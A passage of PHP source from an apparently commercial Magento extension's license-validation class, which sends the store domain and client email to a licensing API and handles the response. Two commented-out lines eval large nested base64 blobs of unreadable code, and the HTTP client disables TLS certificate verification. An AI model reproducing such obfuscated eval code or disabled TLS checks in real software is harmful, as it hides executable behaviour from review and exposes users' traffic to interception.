            case 'license_disabled':
                $message = "Your license has been disabled. 
                To learn more or to request support, please review our $licensingInformation.";
                break;
            case 'license_expired':
                $message = "Your license for this product has expired.
                 To learn more or to request support, please review our $licensingInformation.";
                break;
            default:
                $message = '';
        }

        return __($message);
    }

    public function requestToApi($force = false)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSWGRHRlhWbGw0V2tkMFZWSnJWak5XYlRWTFdWWktXRlZ1V2xwTlIxSlFWR3hWZUZKSFVraGpSMnhYWWtjNGVWWXhVa05oYXpWWVZXeG9WVmRIZUZoV01GWkxVekZWZDJGRk9WVk5WVlkxV1d0V1MxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxWnVWbFZpU0VKWlZXeFNVMDB4V2xkWGJUbFNUV3MxU0ZVeWRHOVZNa1p5VTIxR1YxWkZTa2RVYkZwUFZteFNjMVJyTlZOTlJuQktWMWQwYjJReFVsZFhhMVpYWW14YVdWbHJaRzlXUmxwSFYyNU9XRlpzU25oVlYzaExWMFpLVm1ORVRsZFdNMUp5VldwQmVGSXlTa2RWYlVaT1RVVndVbGRyYUhkUk1WSkhWR3hhVldFd2NHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3R3U0ZZd1dtdFhSbkJHWlVaS1RsSnNjRFZXYWtsM1pEQTFXRlpzWkdoTk1uaFlWbXBLVTFSR2JGZFhiazVwWWtVMWVWZHJVbE5oUmtsM1RWUmFWMVl6VWt4WlYzaEtaVmRXUmxkc2FGZGlWMmhWVjFaV1YyTXhTa2RhUm1oT1ZsaENWRlJYTlc1TmJHUlpZMFYwVjAxRVJrZGFSVlpUVm0xS2NrNVhSbGROUmxWM1drUkdWMVl5UmtaVWJYQlRZVE5DU2xaWE1YZFJNV1J6VjI1V1ZXSnNXbUZaYkZKSFYwWlNjbHBHVGxOaVJrb3dWREZrUjFZd01VVldhbFpXVFc1Q1IxcEVTazlTYlVwR1ZXeG9WMlZyV2t4V1ZsSkhVekpXYzFwR1pHaFNWR3hQVlcxMFlWZHNWbGhPVlU1V1RWVnNNMVl4YUd0WFJscHpZMFJhV21KVVJreGFSVnBoWTFaV2RHUkdUbGRXUmxsNVZtcEtOR0V4VVhsVWJrcHBUVEpvVDFWcVNsTlZiR3hYVm10d2EwMVhlRmhYVkU1dllWWktXVlZyVmxwV1JUVkVWVEo0VDFOV1VuSlBWa3BPWWxob1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmt5ZUhkU2JIQklUMWR3VTAxRVVYaFdSbFpQVFVkR2RGTnNaRmhoYkhCaFZGVmtUazFXY0VkYVJUVnNWbXh3V1ZkcldrZFdhekZHWTBoQ1ZtRXhjRWhhUjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YWQxTlhUa2hTYkdST1VrWlZlRlpxU2pSaU1WVjRVMnRvVkZkSGVGZFpiR2h2VkVad1YxWnJXazlXYkZwSldXdFdTMkZYU2xaWGJIQllZVEpSZDFaRVJrcGxiRlp4VTIxR1UxWnRjM2hYYkdONFZURmtSMVZ1VW1wU01GcFpWV3hTVmsxc1ZYbE9XRTVPVFZaS2VWWkhOVU5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGU1JtUnlWbFJXVGsxRVJrZGFSVlozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6WTBoT1ZXRXdOWEJWYWtKM1UyeGFTRTFVVWxSaVJUVktWa2R6TlZWck1YUmxSVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTNCclRWZDBOVlJzYUV0WlZURnpWMWh3VlZaV1dYZFZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcE1Xa1JHYTJSSFNrWlRiV3hPVjBWS1dsWkdXbTloTWtWNFZHdG9hMU5HY0ZWWlZFcHZWa1pzY1ZOclpGaFdiRXBhVmxkNFIyRldXWGhUYm5CWVlURmFXRlpFU2s1bFZrcHpZVVprYVdKR2NIbFdWM2hoV1ZVeFIxcEdaR0ZUUlRWeFZGVm9VMUpXYkZWVWEwNVZVbXhXTTFVeFVrOVZNVXB5VjJwS1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblZUYkhCb1RXeEtObGRXWkRSa01XUkdUbFpzYWxJeWFGaGFWM2hoVFZaYVZWSnRjRTVXTUhCWlZURm9kMVpIU25OVGJVWlhUVVp3VEZwRVJuTmpWazVWVVcxR1RsWlZjRlpXVmxwclRVZEZlRk5ZYkdoVFIxSmhWRlJLTUUweFRqWlNibHBzVm14d2VGVlhlRmRWTURGMVlVaG9WMDF1YUhGVVZtUlhaRVpLYzJGRk9WZGxiRnBXVm0wMWQxWXlVa2RpU0VaVllUTlNjbFZ0TVRSWGJGcFlUbFZPYUZaVVJuaFdWelZoVmtVeFYxTnFXbGRTTTFKUVdUQmFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVl5YUZWWFYzQkxWREpTUms5V1ZsVmhNMEpVV2xkNFlXVnNaSEpoU0U1U1RWZDBORlV5ZUhOaFJrbDZVVzFvVjAxR1drdGFSRVp6VmpGc05sWnRkRmRYUmtwSlZrUkdhMWxXVWtkU2JGWlNZVE5vVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXUTBVbFpXVjFwSGRGUmlSVll6Vlcwd01WWkdXbFpPVlhoWFZtMVNURlV3V21Ga1IwWklZMFUxYVZKc2NERldha28wWVdzeFZrMVZaR3BTYlhoVlZtcEtVMk5zVm5GVGJUbHFUVlUxVjFkcldtdGhNVXAwWlVac1dtRXlhRkJWTW5oS1pERmtkVk5zYUdoTmJXaE5WMWQwYTFSdFZuTlZiR2hoVWpOU1dWVnNVbGRsYkZsNVpFVTVVazFFUmtsVk1uQlhWVzFLZEZWdVNsZE5SbG96V1RGYWMxWnNjRVphUjNocFUwVktWbFpXWkhkUk1rWkhVMWhzYkZKR2NGVldiR1J2VWtad1YxcEZjR3hXYkZwNFZXMTRkMVJyTVZaWGJsWllWbXh3Y1ZSVlduWmtNVlp6VTIxc1RtSldTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXZWxab1dWY3hTMVl4VG5WVWJIQk9ZbGhvUlZaR1ZtdFRNRFZYVW01U2FGSnVRazlVVmxaM1RURmtjbGt6YUZOTlJFWklXVEJhVTFWdFJuTlhia0pWVmtWYWFGUnNXazlXYkhCRlZXMXdVMkpZVVRGV2JUQXhWakpHY2sxWVRsZGhhMXBWVm14YWQxWkdjRWhrU0U1VVVqRmFTVnBWV25kWFJrcFpVVmhvVmsxV1duRmFWV1JUWkVaU2RWVnNaRmROYkVwM1ZrWlNRMk15U25OalJWcGFaV3hLYUZSWGN6Rk5SbHAwVGxjNWFFMVdiRFJXTW5CaFdWWktWazVWVW1GV2VrWlVWakZhUjJSV2NFaGlSVFZPVW5wcmVsWnJWbGRVTVVaelZXNUtWV0pyU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaExWbFpqTVZReGJGZFhXR1JZWVd4d1dWbHJWVEZTUm5CWFYyNWtXRlp0VWpGVlZ6RkhWMFpKZDA1WVZsaFdNMEpRVm1wS1YxWnRTa1pWYkZwcFlYcFdkbFp0Y0VKTlYwMTRZa2hTVDFaVWJIRlZha0ozVFVaa2NsWnVaR2hXTUhCWVdUQlNTMWRyTVhGUmFsSmFWbGRTVkZVd1pFdFRWbVIwWWtkb1YxWXphRkZXVmxKTFl6RkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJYTlZOTk1WcEZWRzF3YTAxVk1UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcDRXV3RXVjFac1dqWmlSa0pXVmtWd2VsVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZPV0dGclNqTlZNR1JIVWxaR2RHUkdVbE5XVm5BeFZteFdZVlF4Um5SU1dHeFdZVEpvYjFVd1ZrdGpWbkJYVld0S2FtSkhVbFpXUjNocllrWlpkMk5GWkZkTmFrWjJWakp6ZDJWR1RuRlRiSEJPWVd4YU5WZHJWbUZSTWxKSFZXNVdhVkl3V2xoVVZWcHpUVEZaZVdWRk9XbGlWVFZIVkRGU1QxUnNTbGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1c1dGWnNXblpXVkVGNFUwWlNjbFZyTlZKTk1VcDRWa1prTkZkdFVYaFdiRlpVVmtaYWNsWnROVU5OUm14eVdYcEdWVkpyY0RGV1IzTTFWV3N4ZEdWRlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbTFTY2xVeWVFWmxWbFpaV2tad1YySlZOREJYVjNSclUyMVdjMWR1UmxKaE0xSnpWbXhXVmsxV1dsWmFTRTVTWWxaYVIxUnNXbE5oTURGRlZtdFdXbFpzV2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJVWlRaVzE0YjFadGNFTlpWMDV6V2toT2FGSllRbkJaVkVvMFVteFNWbFJxUWxSaVJXdzBXVEJqTlZkdFJYbGhSa0phWVRGWk1GVlhjM2hTYlZKR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMlJ0Vm5OYVNGSnNVak5DY0ZacVRtOU5SbVJ6VjIwNVVrMXJjRWhaTUZwelZrWmFObFpyZEZaaE1VcERXVEo0VDFac1ZuSlRiWEJPVW10d1ZGZFhjRXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCd1dXeGFTMDFHV25ST1dFNW9VbXhzTkZsdWNFZFhiRnBZVkZSR1lWWjZSbFJWYTFweVpWWndSMUpzWkZOU2EzQXhWbXRhVjFKdFVYaFVXR1JwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOak1VcEhVbTVTVm1FemFGaFZNRlV4VlVaV1ZWTnVUbEppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJibVJVVm1zMU1GcFZaSGRYUmtwelkwaHdXRmRJUWxCV1ZFWk9aVlpTV1dKR1FsaFNiSEJNVmxkMFUxRXlTbk5YV0hCYVRUSlNWVlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVJUVjRWVmQ0VDJFeVNsWmpSbXhXWWxSV1JGbFdaRXRqYXpGWlZteFNWMVpyV1hwVk0zQkRZekZLUjFadVJsSmlWMmhVVkZjMWJrMXNXa1pYYkVwT1ZqQndlbGt3V25OV2JVVjNUbGRHVjAxR1ZYaFpla1poWXpKR1JtUkhjRTVUUmtwR1YxWlNUMVF4U2xkV2JHaFFWbnBXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXUTBVbFpXVjFsNlJsWk5WMUpKVjJwT2ExZEhTa2hVV0doaFZucEdTRll3VlRWWFZscHpVMnMxYUdKWWFEVldha28wVkRKR2MySXphRkppUmxwUVZXcEtVMVJHVWxaV1ZFWnJZa2RTZWxkclZUVmhiVXBIVm1wYVYySlVWa1JaVkVaS1pVWmFjVkZzV21sU01ERTBWa1pXWVdReFpGZFVibFpoVWpOQ2NGWnFUbTVOYkZsNVpVVTVhR0pWTVROV1YzaExZVlV4ZEZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VVRGa2NWRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWE1VdGpNVXBaWWtkNFZGSlZjRzlXYlRWM1ZtMVJlRlp1VGxwTk1taHZWV3BDWVZkV2NFVlRWRVpVWWtWd1JsVldhRXRXUmxwV1RsWlNWVlpYVWtoVk1HUkxVMWRPUmsxV1pGTlNiRzk0Vm1wS05HSXhWWGhUYTJoVVlUSm9jRlZxVG05alJteDBaVVYwVTAxWGVIcFhhMVpyWVd4SmQyTkZWbGhoYXpWRVZrWmFSMVpXUm5KbFJsSlhWbFJXUkZZeWNFTmpNVXBIVW14b1lWSllRbE5VVlZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZOZDAxV1drOVhSVFZaVm10Vk1WUkdiSEphUms1VFlrWktNVll5TVVkVk1ERlhWMnBHVmsxV1dsTmFSRUo2WkRKS1JsVnRSbE5YUlVwWlZrWldZVk14U1hoWFdHUllZa1UxVkZscldrdGxiRnBJWkVoa1YxWlVSa1pXYlhoWFZrZEtkR1F6Y0ZkU00xSlFXVEJhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFl4V21GVFZsSnlUMVpLVG1KWWFFUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1VFJVcExWbFJKZUU1SFJuTmFSV1JZWW1zMVlWcFhjekZWTVdSeFVtdE9WMUpyV2pCWmExcDNWMFpLVlZadWNGZFNla1l6VmxSR2QyTXlUa2RoUlRsWFRUQktkMVpHWkRSVE1rMTRWRmhrWVZOSFVuTlpiRlp6VGxaU2MxcEhSbHBXYkc4eVZtMDFSMWR0Um5KalJsSmFZVEZaZDFWcldsZGtWMHBJVW14b1UxWnRkekJXYWtvMFlqRlJkMDFWWkZWaWJGcFdXVzE0ZDJOR2JGZGFSRUpyVFZaR05sZFVUbXRXUlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVsVnRPVlpOUm5CTFdrUkdjbVF4VWxsYVJYaE9Za1ZaTWxaVVNURlJNa1Y0VTFob1YySnNjRlJWYlhSaFRXeGtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVV5TVhkV01ERnhVbXhvWVZKc2NETlZha0UxVm0xS1NHUkdVbE5oTWprMlZtcENVMUV4VVhsVVdHeFRZa2RvV0ZsdGVHRmpiRlp5V1hwU1RtSkdjRmRXYkZKWFZqRktjMk5GVm1GU1JVVjRWV3RrUjFac1NuUk9WbEpYVmxSV1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldNblJxVGxkRmVGUnJaRlJoYXpWaFZGUk9RMDFzY0Voa1JFNXNWbXR3TVZkclpHOVdiVlp6VjJwT1dHRXhTa3hXVkVwSFVqSkplbUpHWkdsaVJuQm9Wa1pTUzAxRk1WZGFSbFpVVmtaYWNsVnNhR3RPVm1SeVdrUlNhRTFWY0ZwWlZXaHJWMFphUm1OR2FHRlNiVkpQV2xaYVlWZFdaSEprUjNoWFZsWnNORlpVUmxkVU1WVjVWbXhrYWxKdGVGUlpWM1JoWVVaWmQxWlVRbXROVmtwSFZXeG9hMVpGTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBaRmRPUmxkdGRGZFdSVnBXVmpGU1FrMVdTa2hTYkZwVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6VkZob1ZtSnVRbFpaVkVFeFpERldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxUkdWWGRXYm1ScVRWZDNNbFpIZEU5aE1rcFdZMFJHVjFKNlJUQlZNbmhMVWxaR2RFNVdVbWhOYkVveVZrWldhMVV4VGxkU2JHeFdZa1ZhY0ZsVVRrTmxiRmw0VjIxMFZtSlZiRE5hUlZwWFlXc3hSVlpyVmxwV2JGcElXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RXNVNjbGxxUVhoVFJsWnlZa1pLV0ZKcmNGTlhWM2hXVFZkV2MySklSbFZoZW14d1ZXeG9VMUpXYkZsalIzUlRWbXhhV1ZReFl6RldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzaFBWR3hKZDFkcmJGcGhNbWd6VmtaYVlWSldXbkZVYkdoWFlsZG9UVmRzWkRSa01WbDRWRzVTYkZJelFrOVVWVloyWlZaa1dFMUVSbFZOYTNCSFdrVldVMVp0U25SbFIyaFhUVVpWZUZSVVJuTmpWazVWVW0xNGFWTkZTbFpYVm1oM1lURktWMVpzYUZCV2VsWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRW93Vm14U1ExTXlUbGRhUm1Sb1VtczFiMWxzVm1GU1ZsWlhXWHBXV0ZacmNGaFdNVkpEVjBaYVJtTkdhR0ZTUlhCVVZUQmtTMU5XWkhSaVIyaFhWbFp3TlZacVNqUlVNazV6WWpOc1YyRnJOVTlWYkdoVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVpVVmtSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXVldaSEpXYlhScFRXczFTVlpIY0ZkVWJFVjZWVzVHV21KR2NHaFViWGh5WkRGc05sWnRkRmROUkVVeFZtMTRhMkV4VmxkV1dHUlVZbGQ0VkZWdGRHRk5iR1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXUTBVbFpXVjFwSGRGUmlSVll6VlcwMVYxZHRWbkpqUm1oYVZucEdVRnBGV21GalZrWnpVMnMxYUdKWWFEVldha28wVkRKR2MySXphRkppUmxwUVZXcEtVMVJHVWxoTlZFNXNZa2RTZVZaWGVFOWhiVXBXWWtSYVYxWjZSbWhYVmxwclVtMU9SVlpzY0doaGVsWk1WMWN4TUU1R1JuSk5WVnByVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VVRGa2NWRnVXbXhXYkhBeFdXdGtkMkZXV2toa2VrWlhZVEZ3Y2xacVNsZGtSbEpaWWtaT2FWWkdXbTlXYkZKTFZESktjMVpyWkZaV1JVcG9WRlZvUTFOV1duTmhSazVXVmpCd1dWWlhOVTlaVmtwWFZtcFNXbUV5VWs5YVYzaFRaRWRHU0ZKck5XbFNiRzk1Vmxod1IxUXdNSGhWYmtwVlltdEtVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZZeWNFTmpNVXBIVW14b1lWSnRlRmhWTUZVeFZVWldWVk51VGxKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYm1SVVZteGFNRlF4Wkc5WFJrcFZVbGhrVjFaWFRYaFdSRXBMVTBaV2NsZHJOVmhTYmtKdlZsUkNZVmxYVm5OYVNFNVhZVEpTYjFsc1drdFRWbXh5Vld0MFdsWnNWalZYYTFKUFZrVXhWMU5xV2xkU00xSlFXVEJhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFQxVkdXbGRUYkU1YVlXdHdjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldjazFXVm5KWGEyUnJZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteHZlbHBHUmxaTmF6VXpWWHBHVTJWc1FsUlpNMEpNVmtoTk9VcDVhM0JQZHowOUp5a3BPdz09JykpOw=='));

        if (!$this->response) {
            $lastApiData = $this->getLastApiData();
            if (!$force && $lastApiData && isset($lastApiData['nextCheck']) && $lastApiData['nextCheck'] > time()) {
                $this->response = [
                    'secretCode' => 'iwd4kot_success',
                ];
            } else {
                try {
                    if (empty($this->getClientEmail())) {
                        $licensingInformation = $this->getLicensingInformation();
                        throw new \Exception(__(
                            "Please enter the email address used to purchase this product in 
                                    order to activate your license. To learn more or to request support, 
                                    please review our $licensingInformation"
                        ));
                    }

                    $http = $this->curlFactory->create();
                    $http->setConfig([
                        'timeout' => 15,
                        'header' => false,
                        'verifypeer' => 0,
                        'verifyhost' => 0
                    ]);
                    $requestJson = [
                        'Domains' => $this->getBaseUrl(),
                        'ExtensionCode' => 'CheckSuite-Enterprise',
                        'ClientEmail' => $this->getClientEmail(),
                        'SecretCode' => 'IWDEXTENSIONS',
                    ];
                    $request = base64_encode(json_encode($requestJson));
                    $http->write(
                        \Zend_Http_Client::POST,
                        'https://api.iwdagency.com/getLicense/' . $request,
                        '1.1'
                    );
                    $response = $http->read();
                    $http->close();
                    $this->parseResponse($response);
                } catch (\Exception $e) {
                    $this->response = [
                        'secretCode' => 'iwd4kot_error',
                        'errorMessage' => $e->getMessage(),
                    ];
                    $this->setModuleActive(0);
                }
            }
        }

        return $this->response;
    }

    public function parseResponse($response)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVmFFTlRWbkJXV2tjNWFHRjZRalJWTW5SclYyMUtTRlZyYUZwTlIxSk1WV3BHVjJSV1JuUmlSbVJPVm01Q1NsWXhaREJoTVVsNVUyNUthVkpXV2s5VmFrcFRWRVpWZDFkcmRHdGlSM2hZV1ZWVk1XRXhTbkpUYWtKWFRXcFdVRll5ZUZwbFZsWnlZVVpvVjJKV1NsRldSbFpyVTIxV2MxUnVSbGRoZWtaWVZXdGFZV1ZHWkZWVFdHaFhUV3RhU1ZaWGRHOVdNVm8yWWtVeFYxZElRa05aTW5oelZqRnNObEp0Y0ZOTlZYQklWbXBKTVZReFpITlhXR3hXWVRGYVlWbFhkSGRXUm14eVZtcENVMUp1UWtwVlZ6RXdWRzFLUm1OSVVsaFdNMEpRVlZSS1IyTXhiM3BpUjBaVFRUSm9kMWRYZUdGWlZUVlhXa1prWVZKR1NtaFpiRlozVTFac2NscElaRnBXYkc4eVZtMXdZVmRIU2tkaGVrWmFaV3RhZWxZeFdsTmpWa1p6WWtVMWFWSnRPVE5XYWtaaFlUSk5lVlJZYUdGTk0wSlhXVzEwUzJOR1duRlNiR1JyVm1zeE5GVnNhR3RXUlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsUkdXRlZyV21GT2JHUllZMFYwVTAxclZqUldiR2h6VmpKS2NrNVhhRnBXYlZKeVdrUkdVbVZzYTNwYVJsSk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVrWnJkMWR1WkdwU2ExcFpWREZrUjFZeVZuSlhXSEJZWVRGYWRsa3lNVXBrTWs1R1lrWlNhVmRIYUhoV1JsSkRVekF4YzJKSVVrOVdWR3h3Vld4b1UxWldiRlZUYlhScFVqRkpNbFZYZERSV1JscFdUbFZPV0dGclNucFZhMXBIVjBad1JtTkdTazVTVm5BeFZsUkdWMVF4Um5OaU0yUnFVbGRvYzFWcVNtOWpWbEpWVW10MFUwMVhlSHBYYTFacllXeEpkMk5GYUZkTmFrWjJXVlphVDFJeFpIVlViRkpYVm10WmVsWXljRU5rTVU1SVZtdG9hRkl6UWs5VVZsWjNVMFprV0dWSGRGTk5helZKVlRKMGExWnRTbkpUYmtKWFlXdGFhRlV3V25OamJIQkdXa2RzYUUweWFGZFdSM2hxVFZac1YxcEZaRlJoTW1oaFdWUktVMU5HYkhSbFJYUlVVbXR3ZUZWWGVIZFdhekYwVldwT1YxSkZOWEZhUkVaT1pESktSbFZzU2xkTmJFcE1WbFpTUTF